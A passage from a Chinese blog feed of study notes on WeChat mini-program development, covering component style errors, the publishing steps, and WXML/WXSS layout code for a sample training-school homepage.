<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523225147855.png" alt="image-20210523225147855"></p>
<p>这里只要在<code>wx:for</code>后面加上<code>wx:key=&quot;index&quot;</code>就可以了，具体参考之前的列表渲染里面有写这个问题 <a href="https://tianzeee.github.io/2021/05/20/wx-small-program/#列表渲染" target="_blank" rel="noopener">https://tianzeee.github.io/2021/05/20/wx-small-program/#%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93</a></p>
<p>第二个：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523225412919.png" alt="image-20210523225412919"></p>
<p>翻译过来是说：有些选择器在组件wxss中是不允许的，包括标签名称选择器、ID选择器和属性选择器。网上查说组件和引用组件的页面不能使用id选择器( #a )、属性选择器( [a] )和标签名选择器，请改用类选择器。所以要把HdView.wxss第12行和15行的标签名选择器改为类选择器，在HdView.wxml里给导航组件加个<code>class=&#39;logo&#39;</code>，给图像组件加上<code>class=&#39;hdPic&#39;</code>，然后wxss里改成类选择器就可以了，这样两个报错就解决了。</p>
<p>另外，之前在监听页面加载函数里写了个request请求，可以把onLoad中调用的东西独立出去，这样看起来简洁，找代码的时候单独找对应的方法就可以了，就是封装的思想，把常用的方法比较多的代码独立出去，用的时候再调用就可以了，具体如下：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523230742151.png" alt="image-20210523230742151"></p>
<h3 id="小程序上线流程"><a href="#小程序上线流程" class="headerlink" title="小程序上线流程"></a>小程序上线流程</h3><p>1.在微信工作平台 <a href="https://mp.weixin.qq.com/" target="_blank" rel="noopener">https://mp.weixin.qq.com/</a> 里点击小程序，跳转到 <a href="https://mp.weixin.qq.com/cgi-bin/wx?token=&amp;lang=zh_CN" target="_blank" rel="noopener">https://mp.weixin.qq.com/cgi-bin/wx?token=&amp;lang=zh_CN</a> 然后注册一个号，注册之后完善一些信息填写等等</p>
<p>2.找到里面的AppID替换掉原来使用的测试号<img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523232653453.png" alt="image-20210523232653453"></p>
<p>3.在开发设置里添加api请求时的合法域名</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523232832463.png" alt="image-20210523232832463"></p>
<p>4.在微信开发者工具里上传</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523232244481.png" alt="image-20210523232244481"></p>
<p>5.上传完成后在版本管理就可以看到了</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210523233044339.png" alt="image-20210523233044339"></p>
<p>6.点击提交审核，等审核通过后点击上线就可以了</p>
<p>具体可以参考官方的小程序发布流程，因为提交审核要填写很多数据，我这里就不弄了，上线没法展示了。到这里B站的小程序基础课就学完了，后面看看跟着学长做点东西吧</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/hellman/p/11007936.html" target="_blank" rel="noopener">https://www.cnblogs.com/hellman/p/11007936.html</a></p>
<p><a href="https://developers.weixin.qq.com/miniprogram/dev/reference/api/module.html" target="_blank" rel="noopener">https://developers.weixin.qq.com/miniprogram/dev/reference/api/module.html</a></p>
]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
  </entry>
  <entry>
    <title>微信小程序项目实例学习笔记1</title>
    <url>/2021/05/22/wx-small-program-project-instance1/</url>
    <content><![CDATA[<p>学完基础之后，跟着老师做个项目案例<a id="more"></a></p>
<h2 id="尺寸"><a href="#尺寸" class="headerlink" title="尺寸"></a>尺寸</h2><p>官网建议设计师用iPhone6作为视觉稿的标准，因为iPhone6的1px=2rpx，这样换算起来方便，比如屏幕宽度为375px，共有750个物理像素，那么直接用750rpx就行了(750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素)</p>
<p><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxss.html" target="_blank" rel="noopener">https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxss.html</a></p>
<blockquote>
<p>rpx之前说过可以根据屏幕自适应，通过rpx，我们只需要根据750的设计稿写代码即可，不必担心在各个平台的适配情况。一次开发，在各个平台都会长得一模一样！</p>
</blockquote>
<p>把设计图修改为750px宽，可以在PS里面用图像大小(Ctrl+Alt+I)长宽比约束后设置宽度为750像素，这样我们用选框工具量多少就给多少rpx就可以了</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210521192049652.png" alt="image-20210521192049652"></p>
<p>看完我还是不太懂他是怎么做到自适应的，反正就这么用吧</p>
<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>可以开着官方文档，一边做一边查文档。</p>
<h2 id="项目案例"><a href="#项目案例" class="headerlink" title="项目案例"></a>项目案例</h2><p><a href="https://edu.newsight.cn/works_xingqing.php?cid=102&amp;id=1340" target="_blank" rel="noopener">https://edu.newsight.cn/works_xingqing.php?cid=102&amp;id=1340</a></p>
<p>按照链接里的项目做一个实例</p>
<h3 id="项目初始化"><a href="#项目初始化" class="headerlink" title="项目初始化"></a>项目初始化</h3><h4 id="全局配置设置window"><a href="#全局配置设置window" class="headerlink" title="全局配置设置window"></a>全局配置设置window</h4><p>因为项目导航栏背景是黑色，所以把新建项目里的<code>&quot;navigationBarBackgroundColor&quot;: &quot;#fff&quot;</code>删掉就行了，因为他默认是黑色</p>
<p>修改导航栏标题颜色为白色，默认是黑色，所以把他改成<code>&quot;navigationBarTextStyle&quot;:&quot;white&quot;</code></p>
<p>修改导航栏标题<code>&quot;navigationBarTitleText&quot;: &quot;新视觉实训&quot;</code></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210521193141834.png" alt="image-20210521193141834"></p>
<h4 id="页面初始化"><a href="#页面初始化" class="headerlink" title="页面初始化"></a>页面初始化</h4><p>因为新建项目会生成一些初始化代码，不需要他们，把页面的wxml、wxss、js和全局样式app.wxss里初始化的内容删掉</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210521194206555.png" alt="image-20210521194206555"></p>
<p>因为js里要存放上图所示的对象，所以输入page选择第二个，就会出现内容为空的page对象</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210521193428128.png" alt="image-20210521193428128"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210521193857749.png" alt="image-20210521193857749"></p>
<h3 id="首页头部模块布局"><a href="#首页头部模块布局" class="headerlink" title="首页头部模块布局"></a>首页头部模块布局</h3><p>index.wxml:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view class&#x3D;&quot;header&quot;&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;container hdcon&#39;&gt;</span><br><span class="line">    &lt;navigator open-type&#x3D;&quot;switchTab&quot; url&#x3D;&quot;&#x2F;pages&#x2F;index&#x2F;index&quot; class&#x3D;&#39;logo&#39;&gt;</span><br><span class="line">      &lt;image mode&#x3D;&quot;heightFix&quot; src&#x3D;&quot;&#x2F;images&#x2F;logo.png&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">    &lt;&#x2F;navigator&gt;</span><br><span class="line">    &lt;view  class&#x3D;&#39;kefu&#39;&gt;</span><br><span class="line">      &lt;button open-type&#x3D;&quot;contact&quot; class&#x3D;&quot;btn&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">      &lt;image mode&#x3D;&quot;heightFix&quot; src&#x3D;&quot;&#x2F;images&#x2F;xiaoxi.png&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>这里学到了一个标签可以用空格来加多个类名，如第二行的<code>class=&#39;container hdcon&#39;</code>，至于躲什么要用这两个类是因为，这个头部的container可以在其他页面复用，所以可以写到全局样式app.wxss里，然后用hdcon类来写首页头部容器自己的特有样式。</p>
<p>用button按钮覆盖图像来做一个点击图标出现联系客服的效果</p>
<p>index.wxss:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.header&#123;</span><br><span class="line">  width:100%; &#x2F;*或者750rpx*&#x2F;</span><br><span class="line">  height:90rpx;</span><br><span class="line">  border: 1px solid red;</span><br><span class="line">&#125;</span><br><span class="line">.hdcon&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: space-between;</span><br><span class="line">  align-items: center;</span><br><span class="line">  height:100%;</span><br><span class="line">&#125;</span><br><span class="line">.hdcon navigator,.hdcon .kefu&#123;</span><br><span class="line">  height:50rpx;</span><br><span class="line">&#125;</span><br><span class="line">.hdcon image&#123;</span><br><span class="line">  height:100%;</span><br><span class="line">&#125;</span><br><span class="line">.kefu&#123;</span><br><span class="line">  position: relative;</span><br><span class="line">  animation: dh linear 1s infinite alternate;</span><br><span class="line">&#125;</span><br><span class="line">.kefu .btn&#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  top:0;</span><br><span class="line">  left:0;</span><br><span class="line">  opacity: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>css一直是我的软肋，学的不是很精，布局这一块老是弄得很乱，写不出理想的布局，跟着老师写有些也是似懂非懂，所以记录一下。</p>
<p>header类布局一个宽高的框来放头部内容，边框可以去掉，这里加上只是为了看看容器有多大</p>
<p>hdcon类表示头部容器(header-container)，把他设置成弹性布局，这样就使两张图在一个水平方向上，<code>justify-content: space-between</code>设置项目在主轴上两端对齐，<code>align-items: center;</code>设置项目与交叉轴中点对齐(相当于垂直居中)，<code>height:100%</code>继承父类header的高</p>
<p>因为头部要用的两个图标在PS里量出来高是50像素，所以把height设置成50rpx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.hdcon navigator,.hdcon .kefu&#123;</span><br><span class="line">  height:50rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面也是继承父类的高：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.hdcon image&#123;</span><br><span class="line">  height:100%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里把kefu类设置为相对定位，用于他子类btn的绝对定位做参考。animation调用全局样式里的自定义动画，linear设置动画从头到尾速度相同，动画完成周期为1s，infinite动画无限循环播放，alternate先执行一遍动画，然后再反向执行一遍动画</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.kefu&#123;</span><br><span class="line">  position: relative;</span><br><span class="line">  animation: dh linear 1s infinite alternate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>btn类设置绝对定位，相对于父类kefu类。然后百分比宽高，离左上0px，设置成透明</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.kefu .btn&#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  top:0;</span><br><span class="line">  left:0;</span><br><span class="line">  opacity: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>app.wxss:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.container&#123;</span><br><span class="line">  padding:0 26rpx;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes dh&#123;</span><br><span class="line">  0%,50%,100%&#123;</span><br><span class="line">    opacity: 1;</span><br><span class="line">  &#125;</span><br><span class="line">  25%&#123;</span><br><span class="line">    opacity: 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>container类设置内边距和box-sizing为border-box。因为所有页面都需要用到头部有内边距的容器，所以把他放在全局样式里</p>
<blockquote>
<p>box-sizing参考第三篇文章</p>
<p>在 CSS 盒子模型的默认定义里，你对一个元素所设置的 width 与 height 只会应用到这个元素的内容区。</p>
<p>如果这个元素有任何的 border 或 padding ，绘制到屏幕上时的盒子宽度和高度会加上设置的边框和内边距值。这意味着当你调整一个元素的宽度和高度时需要时刻注意到这个元素的边框和内边距。当我们实现响应式布局时，这个特点尤其烦人。</p>
<p>box-sizing 属性可以被用来调整这些表现:</p>
<p>content-box 是默认值。如果你设置一个元素的宽为100px，那么这个元素的内容区会有100px 宽，并且任何边框和内边距的宽度都会被增加到最后绘制出来的元素宽度中。</p>
<p>border-box 告诉浏览器：你想要设置的边框和内边距的值是包含在width内的。也就是说，如果你将一个元素的width设为100px，那么这100px会包含它的border和padding，内容区的实际宽度是width减去(border + padding)的值。大多数情况下，这使得我们更容易地设定一个元素的宽高。</p>
</blockquote>
<p>然后用@keyframes关键帧来做自定义动画0%、50%和100%时，opacity为1(不透明)，到25%时opacity为0透明</p>
<p>结果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210521214857571.png" alt="image-20210521214857571"></p>
<p>当然右边那个消息图标会闪动，截图看不到效果</p>
<h3 id="海报轮播模块布局"><a href="#海报轮播模块布局" class="headerlink" title="海报轮播模块布局"></a>海报轮播模块布局</h3><p>index.wxml新增：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view class&#x3D;&#39;banner&#39;&gt;</span><br><span class="line">  &lt;swiper indicator-dots autoplay circular&gt;</span><br><span class="line">    &lt;swiper-item&gt;&lt;image src&#x3D;&#39;&#x2F;images&#x2F;banner1.jpg&#39;&gt;&lt;&#x2F;image&gt;&lt;&#x2F;swiper-item&gt;</span><br><span class="line">    &lt;swiper-item&gt;&lt;image src&#x3D;&#39;&#x2F;images&#x2F;banner2.jpg&#39;&gt;&lt;&#x2F;image&gt;&lt;&#x2F;swiper-item&gt;</span><br><span class="line">    &lt;swiper-item&gt;&lt;image src&#x3D;&#39;&#x2F;images&#x2F;banner3.jpg&#39;&gt;&lt;&#x2F;image&gt;&lt;&#x2F;swiper-item&gt;</span><br><span class="line">  &lt;&#x2F;swiper&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>indicator-dots显示指示点，autoplay自动切换，circular无缝滑动</p>
<p>index.wxss新增：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.banner&#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height:295rpx;</span><br><span class="line">  border: 1px solid green;</span><br><span class="line">&#125;</span><br><span class="line">.banner swiper&#123;</span><br><span class="line">  height: 100%;</span><br><span class="line">  width: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.banner image&#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为轮播的图片高295px，所以height设置成295rpx，border边框只是为了测试看用的。因为swiper组件有个150px默认高度，他会超出banner组件，所以把他设置成100%，当然宽也100%。banner模块里的image也设置宽高100%</p>
<p>结果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210521231300346.png" alt="image-20210521231300346"></p>
<h3 id="专业分类导航滑动模块"><a href="#专业分类导航滑动模块" class="headerlink" title="专业分类导航滑动模块"></a>专业分类导航滑动模块</h3><p>因为横向滚动有两种实现方式，一种注释了的实现，一种没注释的实现。这里顺便记一下快捷键Ctrl+/可以把选中内容注释，和Pycharm一样很方便</p>
<p>index.wxml新增：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scroll-view class&#x3D;&#39;major&#39; scroll-x&gt;</span><br><span class="line">  &lt;!-- &lt;view class&#x3D;&#39;majorcon&#39;&gt; --&gt;</span><br><span class="line">    &lt;navigator class&#x3D;&#39;box&#39; url&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&#39;&#x2F;images&#x2F;kecheng1.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">      &lt;view class&#x3D;&#39;txt&#39;&gt;平面设计&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;navigator&gt;</span><br><span class="line">    &lt;navigator class&#x3D;&#39;box&#39; url&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&#39;&#x2F;images&#x2F;kecheng2.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">      &lt;view class&#x3D;&#39;txt&#39;&gt;室内设计&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;navigator&gt;</span><br><span class="line">    &lt;navigator class&#x3D;&#39;box&#39; url&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&#39;&#x2F;images&#x2F;kecheng3.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">      &lt;view class&#x3D;&#39;txt&#39;&gt;UI设计&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;navigator&gt;</span><br><span class="line">    &lt;navigator class&#x3D;&#39;box&#39; url&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&#39;&#x2F;images&#x2F;kecheng4.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">      &lt;view class&#x3D;&#39;txt&#39;&gt;影视后期&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;navigator&gt;</span><br><span class="line">    &lt;navigator class&#x3D;&#39;box&#39; url&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&#39;&#x2F;images&#x2F;kecheng5.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">      &lt;view class&#x3D;&#39;txt&#39;&gt;WEB前端&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;navigator&gt;</span><br><span class="line">  &lt;!-- &lt;&#x2F;view&gt; --&gt;</span><br><span class="line">&lt;&#x2F;scroll-view&gt;</span><br></pre></td></tr></table></figure>

<p>这里就是在可滚动视图组件里加了五个导航组件，每个导航组件里有图片和文字</p>
<p>index.wxss新增：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* .majorcon&#123;</span><br><span class="line">  padding: 20rpx 0;</span><br><span class="line">  display: flex;</span><br><span class="line">  width: 825rpx;</span><br><span class="line">&#125;</span><br><span class="line">.major .box&#123;</span><br><span class="line">  text-align: center;</span><br><span class="line">  width: 165rpx;</span><br><span class="line">&#125;</span><br><span class="line">.major .pic&#123;</span><br><span class="line">  width: 100rpx;</span><br><span class="line">  height: 100rpx;</span><br><span class="line">&#125;</span><br><span class="line">.major .txt&#123;</span><br><span class="line">  font-size: 26rpx;</span><br><span class="line">&#125; *&#x2F;</span><br><span class="line">.major&#123;</span><br><span class="line">  white-space: nowrap;</span><br><span class="line">  padding: 30rpx 0;</span><br><span class="line">&#125;</span><br><span class="line">.major .box&#123;</span><br><span class="line">  text-align: center;</span><br><span class="line">  width: 165rpx;</span><br><span class="line">  display: inline-block;</span><br><span class="line">&#125;</span><br><span class="line">.major .pic&#123;</span><br><span class="line">  width: 100rpx;</span><br><span class="line">  height: 100rpx;</span><br><span class="line">&#125;</span><br><span class="line">.major .txt&#123;</span><br><span class="line">  font-size: 26rpx;</span><br><span class="line">  margin-top: 8rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为PS里量图标宽高是100px，所以pic里面宽高设置100rpx，字体大小同理</p>
<p>效果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210522000515689.png" alt="image-20210522000515689"></p>
<p>下面一排可以横向滚动，截图看不出来</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1WQ4y1T7D8?p=25" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1WQ4y1T7D8?p=25</a></p>
<p><a href="https://my.oschina.net/cc4zj/blog/1831241" target="_blank" rel="noopener">https://my.oschina.net/cc4zj/blog/1831241</a></p>
<p><a href="https://note.wyzda.com/e8d3d4c02933292f62cce95760ee40dc" target="_blank" rel="noopener">https://note.wyzda.com/e8d3d4c02933292f62cce95760ee40dc</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html</a></p>
<p><a href="https://www.runoob.com/css/css-positioning.html" target="_blank" rel="noopener">https://www.runoob.com/css/css-positioning.html</a></p>
]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
  </entry>
  <entry>
    <title>微信小程序项目实例学习笔记2</title>
    <url>/2021/05/23/wx-small-program-project-instance2/</url>
    <content><![CDATA[<p>续一，完成项目实例剩下内容<a id="more"></a></p>
<h2 id="学员作品模块布局"><a href="#学员作品模块布局" class="headerlink" title="学员作品模块布局"></a>学员作品模块布局</h2><p>index.wxml新增：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view class&#x3D;&#39;works&#39;&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;container&#39;&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;pubTitle&#39;&gt;</span><br><span class="line">      &lt;view class&#x3D;&#39;txt&#39;&gt;学员作品&lt;&#x2F;view&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;more&#39;&gt;更多&gt;&lt;&#x2F;navigator&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;wkMain&#39;&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;box&#39;&gt;</span><br><span class="line">        &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&quot;&#x2F;images&#x2F;xszp1.jpg&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">        &lt;view class&#x3D;&#39;ceng&#39;&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;tit&#39;&gt;UI设计作品&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;line&#39;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;des&#39;&gt;UI Design Works&lt;&#x2F;view&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">      &lt;&#x2F;navigator&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;box&#39;&gt;</span><br><span class="line">        &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&quot;&#x2F;images&#x2F;xszp2.jpg&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">        &lt;view class&#x3D;&#39;ceng&#39;&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;tit&#39;&gt;室内设计作品&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;line&#39;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;des&#39;&gt;Interior Design Works&lt;&#x2F;view&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">      &lt;&#x2F;navigator&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;box&#39;&gt;</span><br><span class="line">        &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&quot;&#x2F;images&#x2F;xszp3.jpg&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">        &lt;view class&#x3D;&#39;ceng&#39;&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;tit&#39;&gt;平面设计作品&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;line&#39;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;des&#39;&gt;Graphic Design Works&lt;&#x2F;view&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">      &lt;&#x2F;navigator&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;box&#39;&gt;</span><br><span class="line">        &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&quot;&#x2F;images&#x2F;xszp4.jpg&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">        &lt;view class&#x3D;&#39;ceng&#39;&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;tit&#39;&gt;网页设计作品&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;line&#39;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;des&#39;&gt;Web design works&lt;&#x2F;view&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">      &lt;&#x2F;navigator&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;box&#39;&gt;</span><br><span class="line">        &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&quot;&#x2F;images&#x2F;xszp5.jpg&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">        &lt;view class&#x3D;&#39;ceng&#39;&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;tit&#39;&gt;电商设计作品&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;line&#39;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;des&#39;&gt;E-business design works&lt;&#x2F;view&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">      &lt;&#x2F;navigator&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;box&#39;&gt;</span><br><span class="line">        &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&quot;&#x2F;images&#x2F;xszp6.jpg&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">        &lt;view class&#x3D;&#39;ceng&#39;&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;tit&#39;&gt;影视后期作品&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;line&#39;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;des&#39;&gt;Late Film and Television Works&lt;&#x2F;view&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">      &lt;&#x2F;navigator&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;box&#39;&gt;</span><br><span class="line">        &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&quot;&#x2F;images&#x2F;xszp7.jpg&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">        &lt;view class&#x3D;&#39;ceng&#39;&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;tit&#39;&gt;建筑景观作品&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;line&#39;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;des&#39;&gt;Architectural landscape works&lt;&#x2F;view&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">      &lt;&#x2F;navigator&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;box&#39;&gt;</span><br><span class="line">        &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&quot;&#x2F;images&#x2F;xszp8.jpg&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">        &lt;view class&#x3D;&#39;ceng&#39;&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;tit&#39;&gt;三维仿真作品&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;line&#39;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;des&#39;&gt;3D simulation works&lt;&#x2F;view&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line">        &lt;!-- 蒙版遮罩层 --&gt;</span><br><span class="line">      &lt;&#x2F;navigator&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>最外层有一个works类，然后里面再套一个之前写在全局样式里的container类增加左右内边距，pubTitle类里有一个文字类txt和导航类more，与pubTitle同级的类wkMain存放作品主要内容，一共八个作品，每一个作品展示是一个导航box类，里面包括图像和覆盖在图片上的蒙版遮罩层ceng类，遮罩层里包括标题tit类、一条横线line类和描述des类</p>
<p>index.wxss新增：</p>
